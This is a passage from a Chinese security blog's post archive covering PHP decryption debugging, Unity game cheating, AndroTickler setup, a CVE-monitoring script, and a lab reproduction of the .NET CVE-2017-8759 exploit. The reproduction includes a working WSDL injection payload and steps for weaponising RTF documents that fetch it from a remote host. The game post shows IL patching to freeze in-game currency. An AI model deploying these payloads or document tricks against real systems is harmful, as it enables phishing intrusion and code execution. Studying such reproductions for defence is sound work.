return;&#125;$prettyPrinter = new PrettyPrinter\\Standard;$prettyCode = $prettyPrinter-&gt;prettyPrintFile($ast);file_put_contents('9014/t2.php', $prettyCode); 然后执行命令php format.php，会生成格式化的t2.php。选择一个不是多字节的字符集，这样在调试的时候可以显示出变量代表的内容。这里用的是Western (ISO 8859-1)。我的思路是在程序开始下断点，然后一直F10（单步跳过），当程序中断时，在此处下断点，F11进入（单步调试）。找到中断的原因，解决后再重复上述操作。F10运行时发现在102行退出了程序。然后在第102行下断点，F11单步运行。进入后继续F10运行。当运行到第23行时，程序退出。前面两个变量是多字节字符，所以看不到内容，后面的是die。看代码可以看到前两个分别在第13行和第15行出现。再次运行，当运行到第13行时F11进入。调用了第52行的函数（由于函数名是乱码，我们给起个名字decode_func）。直接在73行返回值处下断点，然后F5运行，看返回的结果。同理，查看第15行返回的结果。那么第23行处的代码为：php_sapi_name() == &#39;cli&#39; ? die() : &#39;&#39;;由于这里是在命令行下执行的，所以会退出。找到了问题所在，直接注释掉此处即可。然后重新执行。运行至第26行时再次退出。此处代码： 123if (!isset($_SERVER['HTTP_HOST']) &amp;&amp; !isset($_SERVER['SERVER_ADDR']) &amp;&amp; !isset($_SERVER['REMOTE_ADDR'])) &#123; die();&#125; 由控制台发现!isset($_SERVER[&#39;HTTP_HOST&#39;]) &amp;&amp; !isset($_SERVER[&#39;SERVER_ADDR&#39;]) &amp;&amp; !isset($_SERVER[&#39;REMOTE_ADDR&#39;])执行结果为true，所以会退出。还是屏蔽该if判断即可。重新执行。第28-32行对应代码。 12345$t = microtime(true) * 1000;eval(\"\");if (microtime(true) * 1000 - $t &gt; 100) &#123; die();&#125; 此处判断执行时间大于100毫秒就退出，当然还是注释即可。运行至第34行，程序退出。F11进入。调用了第52行的decode_func函数。直接查看返回值。第34行对应的代码为： 1!strpos(decode_func(substr($f, -45, -1)), md5(substr($f, 0, -46))) ? $undefined1() : $undefined2; decode_func是第52行的函数，$f是当前的文件，$undefined1和 $undefined2都不存在。查看strpos中两个参数。那么 ! strops(string,find) 的结果为true。则执行$undefined1()，这个方法不存在，就会Error并退出程序。如下图所示。解决方法是注释第34行或者将”!”去掉。去掉”!”会执行 $undefined2，只会警告而不会退出。这里采用”暴力”的手段，直接注释掉了。然后重新执行程序，F5运行到断点后，F11进入，然后F10运行。运行到38行时，查看返回的内容，是源文件的内容。这个内容就是我们需要的。可以通过file_put_contents将文件保存即可。查看输出的结果。也可以在第102行用file_put_contents将文件保存。使用原作者的decrypt.php也可解密。执行命令：php decrypt.php 9014\\t.php，会生成解密后的文件”t.php.decrypted.php”。 2._LIB库加密调试过程和独立加密类似。还用之前的t.php作为源文件，加密后生成两个文件，一个是t.php，一个是_lib.php。这里的t.php就比较简单了，直接调用了_lib.php文件。主要研究的还是_lib.php文件。老规矩，还是先格式化。新建文件夹viptest，将t.php和格式化后的_lib.php复制进去。然后对格式化后的_lib.php进行编码转换。下断点开始进行调试。这里断点为106行。然后浏览器访问，就会在断点处停止。F11进入后F10单步跳过。运行至第43行时退出，直接屏蔽这几行即可。然后重新访问。运行至第46行，校验数据完整性，由于_lib.php是格式化而来的代码，所以此处校验不通过，就会调用不存在的方法，然后产生错误而退出。执行的代码为 12$f = file_get_contents('_lib.php');!strpos(decode_func(substr($f, -45, -1)), md5(substr($f, 0, -46))) ? $undefined1() : $undefined2; 注释该校验即可。继续执行，查看返回即可看到加密前的代码了。 0x03 总结类似此类的加密文件在进行调试时需要先将代码格式化，选择不是多字节的字符集，然后进行调试。我的测试流程是首先在开始下断点，然后F10执行，当遇到程序退出时，在此处下断点，再次运行，运行到此处F11进入。进入后F10执行，找到问题所在解决后重复上述流程。 这里都是以免费加密为例，关于VIP加密的可以参考作者的文章【原创】某PHP加密文件调试解密过程 ，还有他的虚拟机加密解密的文章也值得学习。 所用的代码 0x04 参考https://www.52pojie.cn/thread-693641-1-1.html","tags":[{"name":"PHP解密","slug":"PHP解密","permalink":"https://fuping.site/tags/PHP%E8%A7%A3%E5%AF%86/"},{"name":"PHP调试","slug":"PHP调试","permalink":"https://fuping.site/tags/PHP%E8%B0%83%E8%AF%95/"}]},{"title":"Unity3d类安卓游戏逆向分析初探","date":"2018-01-31T12:40:26.000Z","path":"2018/01/31/Unity3d-Android-Game-Reverse-Analysis-Of-The-Tabikaeru/","text":"0x01 前言最近一款养蛙的游戏非常火，但是语言是日文的。下载了一个汉化的，结果广告一大堆。反编译之后查看是Unity游戏，之前没接触过，就想着跟着看一下。关于这类的破解，可以在52pojie上进行搜索。有很多类似的案例。这里主要采用的工具为dnSpy，dnSpy 是一款针对 .NET 程序的逆向工程工具。反编译和打包采用的是apktool，当然也可以直接用改之理等工具。 0x02 修改数据下载app后重命名为zip文件，发现存在assets\\bin\\Data\\Managed目录，那么该游戏应该为Unity游戏。那么需要分析的文件就是就是Assembly-CSharp.dll。 首先修改一下抽奖券的数量。安装游戏后，找到抽奖的地方。抽奖的时候提示券不足。 使用dnSpy打开Assembly-CSharp.dll文件，然后搜索字符串”足”，可以发现有两个，打开后发现是第一个。由此可以猜测TicketStock代表抽奖券库存。ticket表示抽奖券数量。当页查找ticket，发现有一个initialize方法进行初始化。我们将此处的数量改为1000.快捷键Ctrl+E编辑IL指令。找到ticket变量后，将ldc.i4.0改为ldc.i4，然后将数值改为1000.确定后，发现ticket数值已经改变。重新打包APP后，进行安装。打开抽奖界面发现数量已经改变为1000。这样虽然达到了修改抽奖券的效果，但数量再大，总会被抽完的。那就换种方法，比如说抽奖的时候增加奖券，或者奖券一直不变。这里采用奖券数量固定的方法，使其不会变动。 1234567891011if (SuperGameMaster.TicketStock() &lt; 5)&#123; ConfilmPanel confilm = this.ConfilmUI.GetComponent&lt;ConfilmPanel&gt;(); confilm.OpenPanel(\"ふくびき券が足りません\"); confilm.ResetOnClick_Screen(); confilm.SetOnClick_Screen(delegate &#123; confilm.ClosePanel(); &#125;); return;&#125; 已知抽奖的时候奖券是从SuperGameMaster.TicketStock()获取的，找到该方法。令其返回值为固定的数值。右键编辑IL指令。将其值修改为9000.然后保存后打包并重新安装。此时无论抽多少次，奖券都不再变化。另一个就是修改三叶草的数量了。三叶草是该游戏中流行的货币，买东西都是需要该物品。同理找到CloverPointStock()方法。将其返回值修改为8888。之后就可以随便买买买了，三叶草的数量也不会发生变化了。 0x03 汉化然后就是进行汉化了。汉化的方法和上面的类似。首先搜索需要修改的文字。例如给小青蛙起名字的时候。直接进行字符串搜索。然后修改为对应的中文就行了。进入游戏查看。修改其他处的文字也是这样操作即可。当然这种修改方法比较慢，还有另外一种，直接将他人汉化过的dll文件复制进来，可以快速达到汉化的目的，也没有广告的烦恼了。 0x04 其他修改按照以上方法修改的时候，每次都需要重新玩，还要经过”新手教学阶段”。我们可以使用安卓的备份功能，进行备份。然后重新安装app后直接恢复备份即可。首先需要在AndroidManifest.xml文件中增加android:allowBackup=&quot;true&quot;。这样就可以使用备份命令了。命令如下： 12adb backup -nosystem -noshared -noapk -f jp.co.hit_point.tabikaeru.ab jp.co.hit_point.tabikaeru//-nosystem表示不备份系统应用 -noshared表示不备份应用存储在SD中的数据 -noapk表示不备份应用APK安装包 -f 表示备份的.ab文件路径和文件名 最后是要备份应用的packageName 手机备份操作界面： 恢复命令比较简单 1adb restore jp.co.hit_point.tabikaeru.ab 手机备份还原界面 然后就可以进行进度的保存和恢复了。就省去了每次都要进行”新手教学”的烦恼。 0x05 总结这个游戏修改起来比较简单，首先判断为该游戏为Unity3d。然后使用dnSpy来对Assembly-CSharp.dll文件进行修改。根据特定的字符串找到需要修改的位置，修改后进行打包签名后即可。原版APK修改后的APK（修改了抽奖券、三叶草和部分汉化） 0x06 参考[1]https://www.52pojie.cn/search.php?mod=forum&amp;searchid=23262&amp;orderby=lastpost&amp;ascdesc=desc&amp;searchsubmit=yes&amp;kw=unity3d[2] https://www.52pojie.cn/thread-647612-1-1.html","tags":[{"name":"Unity3d","slug":"Unity3d","permalink":"https://fuping.site/tags/Unity3d/"},{"name":"青蛙旅行","slug":"青蛙旅行","permalink":"https://fuping.site/tags/%E9%9D%92%E8%9B%99%E6%97%85%E8%A1%8C/"},{"name":"逆向分析","slug":"逆向分析","permalink":"https://fuping.site/tags/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"}]},{"title":"安卓渗透利器AndroTickler使用排雷指北","date":"2018-01-03T02:07:00.000Z","path":"2018/01/03/How-To-Use-AndroTickler/","text":"0x01 前言AndroTickler是一款用于Android应用程序渗透测试和审计的工具包。更多介绍可以参考https://github.com/ernw/AndroTickler 。本文主要记录一下在使用过程中所遇到的问题和解决的方法。 本文的测试环境如下：系统为win10 x64，jdk版本为java8，gradle版本为4.1。采用了夜神模拟器。 主要包括以下几个方面。 编译环境的准备 使用过程中遇到的问题以及解决方法 0x02 编译环境的准备1. Gradle的安装首先需要安装Java，我采用的是Java8（安装工具说明，需要Java7以上）。下载地址：http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html 。（安装过程省略） 关于gradle的安装可以参考https://gradle.org/install/ ，我这里是直接下载安装包https://services.gradle.org/distributions/gradle-4.4.1-bin.zip， 解压之后添加环境变量。 2. cmder工具安装该步骤非必需，可以省略。下载地址：https://github.com/cmderdev/cmder/releases/解压添加环境变量即可使用。 使用该工具除了界面好看外，可以多个tab，也可以运行部分linux命令。当然也可以使用其他工具，如cygwin。如果没有使用这类工具的话，需要将代码中一些命令修改，如cp命令。 3. Git工具安装该步骤非必需，可以省略。下载地址：https://desktop.github.com/安装即可。然后下载 AndroTickler 4.其他工具安装还需要安装adb, sqlite3, strings等工具。adb的话安装夜神模拟器的时候自动，名字为nox_adb，功能一样。sqlite3可以用https://www.sqlite.org/ 下载。strings的官网，https://docs.microsoft.com/en-us/sysinternals/downloads/strings ，下载地址为：https://download.sysinternals.com/files/Strings.zip 。解压后加入环境变量即可。 然后就是开始编译和使（入）用（坑）了。 0x03 使用过程中遇到的问题以及解决方法上面环境已经搭建好了，代码也下载了，然后就开始入坑吧。编译的话很简单，使用命令gradle &amp;&amp; gradle build即可。然后会在build\\libs目录下生成AndroTickler.jar文件。 软件生成了，那么看看有什么功能吧，使用命令： 1java -jar AndroTickler.jar -h 貌似一切正常。下面开始查看安装的app。 使用命令 1java -jar AndroTickler.jar -pkgs 并没有返回安装的app已知列出已经安装的app命令是adb shell pm list package而我用的模拟器，所以应该使用命令是nox_adb shell pm list package所以这里要替换程序中的adb为nox_adb。这里我用idea来打开代码然后将命令中的adb替换为nox_adb即可替换后重新编译并查看已安装的app。 发现列出了安装过的app。虽然有警告，暂且不管。查找特定的app并查看信息 12java -jar AndroTickler.jar -findPkg com.example.simpleencryptionjava -jar AndroTickler.jar -pkg com.example.simpleencryption -info 发现报错，提示没有连接的设备。通过adb查看连接的设备。nox_adb devices -l发现有，但是使用工具未查看到。通过错误的信息，定位到initialization\\TicklerChecks.java的checkDevices方法。 123456789101112131415public void checkDevices() throws TNotFoundEx&#123; String command = \"nox_adb devices -l\"; Commando commando = new Commando(); String op = commando.executeCommand(command); OtherUtil oU = new OtherUtil(); ArrayList&lt;String&gt; devices = oU.getRegexFromString(op, \"(model:.*?device:.+$?)\"); int eligDevices = devices.size(); if (eligDevices&gt;1) throw new TNotFoundEx(\"ERROR: 2 or more Android devices are connected to the host, please connect only one Android device.\"); if (eligDevices == 0) throw new TNotFoundEx(\"ERROR: No Android devices detected by the host. Execute adb devices -l to check the connected devices\"); &#125; 发现通过命令查询的结果为： 12List of devices attached127.0.0.1:62025 device 明显通过正则不能匹配，那就改正则了。为了方便，直接改为ArrayList&lt;String&gt; devices = oU.getRegexFromString(op, &quot;(.*device\\\\n)&quot;); 然后编译运行。这个提示libs需要和jar文件在同一目录。将Tickler.conf和libs复制到与AndroTickler.jar同一目录。竟然报同样的错误，而且该目录下出现了一个H的文件夹。通过错误的信息，定位到initialization\\TicklerChecks.java的checkExternalLibDir方法。 123456789101112131415private void checkExternalLibDir() throws TNotFoundEx&#123; String jarLoc = this.getJarLocation(); String libDirLoc=jarLoc+TicklerConst.generalLibName; File tickLib = new File (libDirLoc); if (tickLib.exists())&#123; TicklerVars.isLib = true; TicklerVars.libDir = libDirLoc; &#125; //Lib directory not found else &#123; throw new TNotFoundEx(\"Lib directory not found. \\nMake sure that \"+TicklerConst.generalLibName+\" directory exists in the same directory as Tickler.jar\"); &#125; &#125; 查看代码，tickLib由jarLoc和TicklerConst.generalLibName拼接，而TicklerConst.generalLibName是常量，所以需要查看jarLoc是如何获取的。跟进getJarLocation方法 1234567891011121314public String getJarLocation()&#123; File myJar; try&#123; File myJar1 = new File(System.getProperty(\"java.class.path\"));//获取jar路径 myJar = myJar1.getAbsoluteFile().getParentFile();//获取jar上级目录 &#125; catch(Exception e)&#123; myJar = new File(\".\"); &#125; String jarLoc = this.correctJarLoc(myJar.getAbsolutePath()); return jarLoc;&#125; 首先获取了运行的jar的路径，然后获取其父路径并将其值赋值给myJar。然后调用了correctJarLoc方法。进行跟进correctJarLoc方法，进去查看 1234567891011121314151617181920public String correctJarLoc(String jarLoc)&#123; String finalLoc=jarLoc; if (jarLoc.contains(\":\"))//wtf? 造成问题的代码 finalLoc = jarLoc.substring(0, jarLoc.indexOf(\":\"));//wtf? 造成问题的代码 Matcher m = Pattern.compile(\"\\\\s+(.+)\").matcher(jarLoc); if (m.find()) finalLoc = m.group(1); if (finalLoc.matches(\".+\\\\n$\"))&#123; finalLoc = finalLoc.substring(0, jarLoc.length()-1); &#125; if (finalLoc.matches(\".+\\\\.$\"))&#123; finalLoc = finalLoc.substring(0, jarLoc.length()-1); &#125; if (!finalLoc.matches(\".+/$\"))&#123; finalLoc = finalLoc+\"/\"; &#125; return finalLoc;&#125; 然后立马发现问题的所在了。这里因为是windows系统，所以路径出现:是很正常的，而这里直接截取了盘符。这就是出现了一个名为H的文件夹的原因。解决方法：删除这两行代码即可。之后再编译运行。编译运行后发现警告没了，但新的错误出现了。通过错误信息定位到apk\\ApkToolClass.java的apkToolDecode方法。暂时先利用下面代码替换。 12//File file = new File(\"/dev/null\");File file = new File(\"H:\\\\tmp\\\\\"); 从之后文件的内容来看，该文件里面会记录一些操作记录。 再次编译运行，没有任何结果信息也没有报错。而在Tickler_workspace\\com.example.simpleencryption\\logs.pullLog.log发现了这样的日志。安装过的app保存位置为：/data/app修改Tickler.conf文件 123Tickler_local_directory &#x3D; H:&#x2F;workspace&#x2F;eclipse&#x2F;AndroTickler&#x2F;build&#x2F;libs&#x2F;Tickler_sdcard_directory &#x3D; &#x2F;data&#x2F;app&#x2F;Frida_server_path &#x3D; &#x2F;data&#x2F;local&#x2F;tmp&#x2F;frida-server-10.3.14-android-arm 编译运行，没有报错，查看Tickler_workspace\\com.example.simpleencryption\\logs.pullLog.log文件 1cannot create &#39;H:\\workspace\\eclipse\\AndroTickler\\build\\libs\\com.example.simpleencryption\\\\&#39;: Not a directory 然后通过调试，来寻找错误的地方（这里的图为之前调试的图( ╯□╰ )） 执行的命令为：nox_adb pull /data/app/com.jnu.ctf2017-1.apk H:/AndroTickler/com.jnu.ctf2017//测试后发现，使用adb pull导出文件时，pc的路径最后不能有\\或者/ 直接修改base\\FileUtil.java中copyDirToHost方法 12// this.pullFromSDcard(TicklerVars.sdCardPath+srcName, dest+\"/\"); by fuping this.pullFromSDcard(TicklerVars.sdCardPath+srcName, dest); 修改base\\FileUtil.java中pullFromSDcard方法 12345678910111213public void pullFromSDcard(String src, String dest) &#123; String fName = this.getFileNameFromPath(src); this.warnOverrideAndDelete(dest+fName); //by fuping File f = new File(dest); if(!f.exists())&#123; f.mkdirs(); &#125;// by fuping dest = f.getPath(); String command = \"nox_adb pull \"+src+\" \"+dest; int pullResult=this.commando.executeProcessForAdbPull(command); this.deleteDirFromDevice(src);&#125; 还有一些需要更改的地方，例如将代码中调用dex2jar-2.1的.sh脚本改为.bat 。之后在编译运行。 此时这个工具才能算可以使用，还有其他功能（例如Frida），我并未测试。当然还可能还会有其他问题，这里就不再深入了。 这里放上一个查看app详细信息的结果。 可以看到安装日期、使用权限、数据库存储等等信息。 0x04 总结虽然看起来在运行的时候有很多坑，但其原因也是环境的问题（我采用的是Windows）。而且我使用了模拟器而不是真机，所以也可能造成一些问题。但是这些都是无关紧要的，都是很小的错误，修改一下就可以用了。我这里仅仅使用了查看app信息的功能，并未测试其他功能。更多功能可以参考https://github.com/ernw/AndroTickler 。","tags":[{"name":"安卓","slug":"安卓","permalink":"https://fuping.site/tags/%E5%AE%89%E5%8D%93/"},{"name":"AndroTickler","slug":"AndroTickler","permalink":"https://fuping.site/tags/AndroTickler/"}]},{"title":"CVE监控之Python代码实现","date":"2017-12-11T07:44:05.000Z","path":"2017/12/11/NEW-CVE-Monitor/","text":"0x01 前言前几天在先知上看到伪全栈式安全研发：CVE监控这篇文章，就想着也实现一下代码进行最新CVE的监控。语言采用了Python，数据库也为Mongodb数据库。代码和实现的什么不重要，重要的是过程。 主要包括以下几个方面。 获取最新的CVE列表和详情主要采用了python的requests模块和BeautifulSoup模块。 将最新的CVE信息存入数据库数据库使用了Mongodb，采用了pymongo模块。 通过邮件发送最新的CVE信息发送邮件采用了smtplib模块。 定时执行任务使用了linux的crontab来实现。 0x02 实现过程1. 获取最新的CVE列表和详情访问https://cassandra.cerias.purdue.edu/CVE_changes/today.html ，可以获取每天新增的CVE信息。 通过查看源代码，发现没html没什么规律可言，都是些超链接。要想获取最新的列表，可以通过取文本中间的方法来获取。这里需要获取New entries:和Graduations之间的内容。然后通过BeautifulSoup来解析其中的超链接。主要代码如下： 1234567891011def getCVES():# 获取最新到CVE列表 try: url = 'https://cassandra.cerias.purdue.edu/CVE_changes/today.html' res = requests.get(url, headers=headers, timeout=60) CVEList_html = getMiddleStr(res.text, 'New entries:', 'Graduations') soup = BeautifulSoup(CVEList_html, 'html.parser') for a in soup.find_all('a'): print(a['href']) print(a.string) except Exception as e: print(e) 获取文本中间内容的代码： 123456def getMiddleStr(content, startStr, endStr): # 获取文本中间内容 startIndex = content.index(startStr) if startIndex &gt;= 0: startIndex += len(startStr) endIndex = content.index(endStr) return content[startIndex:endIndex] 运行效果：超链接的地址是CVE的详情。随便进入一个查看效果。例如：http://cve.mitre.org/cgi-bin/cvename.cgi?name=2017-0874这里需要记录的信息有：CVE-ID、Description、Assigning CNA和Date Entry Created。 通过查看网页源码发现，所有需要记录的信息在一个表格里面。但该页面有很多table，而且没有明显的标识来区分。而该table在div中，可以通过id来获取。CVE-ID可以直接通过soup.find(nowrap=&#39;nowrap&#39;).find(&#39;h2&#39;).string获取。其他的几个信息可以通过获取相应tr中的td中的内容获得。这样就可以获取最新的CVE列表和详情。 2. 将最新的CVE信息存入数据库数据库采用了Mongodb。安装方法apt-get install mongodb然后启动数据库 1234mkdir /var/data/ #创建数据存储位置mongod --port 65521 --dbpath /var/data/ --bind_ip 127.0.0.1 #启动mongodb，指定端口和路径，且仅本机可连mongo 127.0.0.1:65521/mydb db.createUser(&#123;user:'tass',pwd:'liehu',roles:[&#123;role:'dbOwner',db:'mydb'&#125;]&#125;) #添加认证 Mongodb数据库插入一条数据，一般使用的是insert。 1db.test.insert(&#123;\"title\":\"test1\", \"blog_cont\":\"test1\"&#125;) 如果我们想实现一个如果title存在，就对数据进行更新，不存在，就插入。可以这样来实现。 123db.test.update(&#123;\"title\":\"test2\"&#125;, &#123;$set:&#123;\"title\":\"test2\", \"blog_cont\":\"test2\"&#125;&#125;, &#123;upsert:true&#125;)db.test.update(&#123;\"title\":\"test1\"&#125;, &#123;$set:&#123;\"title\":\"test1\", \"blog_cont\":\"test3\"&#125;&#125;, &#123;upsert:true&#125;)db.test.find() 执行完成后最终有两条数据，title分别为test1和test2，对应的内容为test3和test2. 因此在插入数据的时候，我们可以直接使用db.test.update({&quot;title&quot;:&quot;test2&quot;}, {$set:{&quot;title&quot;:&quot;test2&quot;, &quot;blog_cont&quot;:&quot;test2&quot;}}, {upsert:true})这种方式来实现。 更新只需更改data内容即可。 为了数据库的安全性，使用--bind_ip 127.0.0.1来设置数据库仅本地可以连接。更多mongodb数据库的配置可以参考MongoDB Mongodb.conf 配置 Auth。 3. 通过邮件发送最新的CVE信息发送邮件这里用到了smtplib。发送邮件比较简单，就直接贴代码了。 123456789101112131415161718def sendEmail(mail_msg): # 发送邮件 sender = 'from@163.com' # 发件人 password = 'password' # 发件人密码 receiver = 'receiver@163.com' # 收件人 message = MIMEText(mail_msg, 'plain', 'utf-8') #以文本发送 message['From'] = sender message['To'] = receiver subject = '最新CVE列表' message['Subject'] = Header(subject, 'utf-8') try: smtpObj = smtplib.SMTP('smtp.163.com') smtpObj.login(sender, password) smtpObj.sendmail(sender, receiver, message.as_string()) print('邮件发送成功') except smtplib.SMTPException: print('Error: 无法发送邮件') 4. 定时执行任务直接使用linux下的crontab来完成。例如设置每天早上7点执行，可以这样设置： 10 7 * * * python /myJob/CVE-Monitor.py &gt;&gt; /log/CVE-Monitor.log 根据https://cassandra.cerias.purdue.edu/CVE_changes/ 看到today.html更新的时间是明天的06:53，对应北京时间是19:53。若想及时获取，可以更换时间为20:00. 5.完善和优化到这里监控脚本完成的差不多了，剩下就是如何来融合一起并改善了。为了方便发送邮件内容和插入数据库，我们新建类CVEInfo。主要代码如下： 123456789101112131415161718192021222324class CVEInfo: def __init__(self,url, cveid, description, company, createdate): self.url = url self.cveid = cveid self.description = description self.company = company self.createdate = createdate def show(self): return '&lt;p&gt;&lt;b&gt;漏洞编号：&lt;/b&gt;&lt;a href=\"'+self.url+'\"&gt;'+self.cveid+'&lt;/a&gt;&lt;/p&gt;&lt;b&gt;相关厂商：&lt;/b&gt;'\\ +self.company +'&lt;br&gt;&lt;b&gt;披露日期：&lt;/b&gt;'\\ +self.createdate+'&lt;br&gt;&lt;b&gt;漏洞描述：&lt;/b&gt;'\\ +self.description + '&lt;br&gt;&lt;br&gt;&lt;hr/&gt;' def add(self): data = &#123; 'cveid': self.cveid, 'description': self.description, 'company': self.company, 'createdate': datetime.strptime(self.createdate, \"%Y%m%d\"), 'addDate': time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time())), &#125; return data 为了美观，将邮件以html方式发送 1message = MIMEText(mail_msg, 'html', 'utf-8') 邮箱收到的效果：查看数据库数据： 从上面两张图片可以看到有三十多个，但我们有时候并不是都需要看。我们可以根据Description中关键信息来进行过滤，仅仅将我们需要关注的CVE信息发送到邮箱或进行入库操作。如下图为获取CVE-2017-8295的信息。然后修改main方法，根据是否有关注的CVE信息来决定邮件的内容。这里先用本地服务器为例，新建today.html文件，其中包含CVE-2017-9805和CVE-2017-16241。运行代码结果打印了一条包含了我们的关键字的数据。邮件中的内容如下所示：这样就能过滤其他CVE信息，仅仅记录我们关注的内容了。 0x03 总结本文主要用到了BeautifulSoup解析网页和mongodb数据库的使用，然后就可以将想要的内容保存到数据库中。脚本并不限于在此处使用，也可以修改一下抓取其他网站内容。代码地址：https://github.com/fupinglee/MyPython/blob/master/work/CVE-Monitor.py查询的功能就不做了，若想实现其他功能，可以自行增加和修改。 0x03 参考[1]https://xianzhi.aliyun.com/forum/topic/1694/[2]http://blog.csdn.net/guoxingege/article/details/47339885","tags":[{"name":"CVE-Monitor","slug":"CVE-Monitor","permalink":"https://fuping.site/tags/CVE-Monitor/"},{"name":"Mongodb数据库","slug":"Mongodb数据库","permalink":"https://fuping.site/tags/Mongodb%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"Python","slug":"Python","permalink":"https://fuping.site/tags/Python/"}]},{"title":".NET框架0Day漏洞CVE-2017-8759复现过程","date":"2017-09-14T02:07:20.000Z","path":"2017/09/14/CVE-2017-8759-Remote-Code-Execution-Vulnerability-Replication/","text":"漏洞概述FireEye最近检测到一个恶意的Microsoft Office RTF文档，利用CVE-2017-8759（一种SOAP WSDL解析器代码注入漏洞）。此漏洞允许在解析SOAP WSDL定义内容期间注入任意代码。 基本信息漏洞名称：.NET Framework远程代码执行漏洞漏洞编号：CVE-2017-8759漏洞影响：.NET系列产品的远程代码执行（RCE）并进一步控制系统利用场景：远程钓鱼、社会工程影响版本：以下.NET版本&emsp;&emsp;&emsp;&emsp;&emsp;&nbsp;&nbsp;Microsoft .NET Framework 4.6.2&emsp;&emsp;&emsp;&emsp;&emsp;&nbsp;&nbsp;Microsoft .NET Framework 4.6.1&emsp;&emsp;&emsp;&emsp;&emsp;&nbsp;&nbsp;Microsoft .NET Framework 3.5.1&emsp;&emsp;&emsp;&emsp;&emsp;&nbsp;&nbsp;Microsoft .NET Framework 4.7&emsp;&emsp;&emsp;&emsp;&emsp;&nbsp;&nbsp;Microsoft .NET Framework 4.6&emsp;&emsp;&emsp;&emsp;&emsp;&nbsp;&nbsp;Microsoft .NET Framework 4.5.2&emsp;&emsp;&emsp;&emsp;&emsp;&nbsp;&nbsp;Microsoft .NET Framework 3.5&emsp;&emsp;&emsp;&emsp;&emsp;&nbsp;&nbsp;Microsoft .NET Framework 2.0 SP2影响产品：Office(word excel)Edge IE WinOS Skype Lync Sharepoint 漏洞利用点PrintClientProxy方法中的WSDL解析器模块中存在代码注入漏洞。如果提供的包含CRLF序列的数据，则IsValidUrl不会执行正确的验证。这就造成了攻击者注入和执行任意代码。 这里不详细介绍了（因为我也不懂），可以参考火眼和360的分析。 利用过程方法一新建一个图片文件，名字为office.png（其他格式也行），内容为： 12345678910111213141516171819202122&lt;definitions xmlns=\"http://schemas.xmlsoap.org/wsdl/\" xmlns:soap=\"http://schemas.xmlsoap.org/wsdl/soap/\" xmlns:suds=\"http://www.w3.org/2000/wsdl/suds\" xmlns:tns=\"http://schemas.microsoft.com/clr/ns/System\" xmlns:ns0=\"http://schemas.microsoft.com/clr/nsassem/Logo/Logo\"&gt; &lt;portType name=\"PortType\"/&gt; &lt;binding name=\"Binding\" type=\"tns:PortType\"&gt; &lt;soap:binding style=\"rpc\" transport=\"http://schemas.xmlsoap.org/soap/http\"/&gt; &lt;suds:class type=\"ns0:Image\" rootType=\"MarshalByRefObject\"&gt;&lt;/suds:class&gt; &lt;/binding&gt; &lt;service name=\"Service\"&gt; &lt;port name=\"Port\" binding=\"tns:Binding\"&gt; &lt;soap:address location=\"http://localhost?C:\\Windows\\System32\\calc.exe?011\"/&gt; &lt;soap:address location=\"; if (System.AppDomain.CurrentDomain.GetData(_url.Split('?')[0]) == null) &#123; System.Diagnostics.Process.Start(_url.Split('?')[1], _url.Split('?')[2]); System.AppDomain.CurrentDomain.SetData(_url.Split('?')[0], true); &#125; //\"/&gt; &lt;/port&gt; &lt;/service&gt;&lt;/definitions&gt; 然后放在web目录。根据样本文件，发现是在word文档中添加一个SOAP标记。格式为soap:wsdl=http://192.168.135.135/office/office.png本次以样本为例，然后修改其中的地址。 分别用样本和自己的web地址生成特hex格式的地址，然后将样本中的地址更换为自己的地址即可。（注意替换的长度需保持一致） 样本文件最重要的是倒数第三行（看起来是空白），然后可以将上面无用的内容全部删除，只留下最后三行。 然后就是打开该word文档，就可以看到计算器弹出。但实现的过程有点问题，就是必须点更新链接才会触发（即使将添加objupdate还是不行）。 方法二参考https://github.com/vysec/CVE-2017-8759新建o.png，内容为： word.db内容： 新建一个rtf文档，随意插入一个对象。例如http://192.168.135.135/office/o.png (这是为了下面替换objdata内容)用记事本打开，将\\object\\objautlink\\rsltpict修改为\\object\\objautlink\\objupdate\\rsltpict打开blob.bin文件 将其中的地址修改为http://192.168.135.135/office/o.png复制原来的地址，尽量多复制点空格。 然后生成新的hex地址 然后用生成的地址替换blob.bin中的地址然后将blob.bin中的内容替换word文档的objdata内容。然后打开word文档，就会有神奇的事情发生。 恶意软件将被放置在C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\OfficeUpdte-KB[6个随机数字].exe 以上均在虚拟机上测试。没有使用样本中的left.jpg。最后结果确实如火眼所说的那样生成了OfficeUpdte-KB******.exe文件。在win10(真机)上测试的时候还生成了http1001924168413541350office0office4png.pdb、http1001924168413541350office0office4png.dll和Logo.cs三个文件。这里方法一没有直接执行的原因我也不太清楚，但是用方法二插入office.png，也是不会直接执行的。如果方法一和二中过程替换一下，效果也是一样的。 方法三下载脚本https://github.com/fupinglee/MyPython/blob/master/exploit/CVE-2017-8759/CVE-2017-8759_exploit_rtf.py 使用方法：python CVE-2017-8759_exploit_rtf.py http://192.168.135.135/office/office.png会在当前目录生成文件cve-2017-8759.rtf，打开即可。 根据CVE-2017-0199的脚本改写而来，仅仅保留并修改了生成文件的代码。 参考链接[1].https://www.fireeye.com/blog/threat-research/2017/09/zero-day-used-to-distribute-finspy.html[2].http://mp.weixin.qq.com/s/_rfRtj6da1nowI4qMmkLaA[3].https://www.mdsec.co.uk/2017/09/exploiting-cve-2017-8759-soap-wsdl-parser-code-injection/","tags":[{"name":"CVE-2017-8759","slug":"CVE-2017-8759","permalink":"https://fuping.site/tags/CVE-2017-8759/"},{"name":".NET Framework","slug":"NET-Framework","permalink":"https://fuping.site/tags/NET-Framework/"}]},{"title":"使用PentestBox工具利用ETERNALBLUE对Win7进行攻击，获取Meterpreter反弹","date":"2017-08-16T06:54:20.000Z","path":"2017/08/16/HOW-TO-USE-PENTESTBOX-TO-EXPLOIT-ETERNALBLUE-ON-WINDOWS-7/","text":"前言MS17-010已经过去很久了，利用PentestBox的方式也提到过，但都是基于python2.6那种方式实现的。本文将使用Sleepya 的脚本利用ETERNALBLUE来实现对Win7进行攻击，从而获取Meterpreter反弹。 靶机为Windows 7，IP为192.168.131.133。攻击机为Win10系统，安装了PentestBox，IP为192.168.217.1。脚本下载地址：https://github.com/worawit/MS17-010 漏洞利用测试1.安装NASM下载地址：http://www.nasm.us/pub/nasm/releasebuilds/ ，我这里用的是2.13。然后开始安装。 安装完成后加入环境变量。 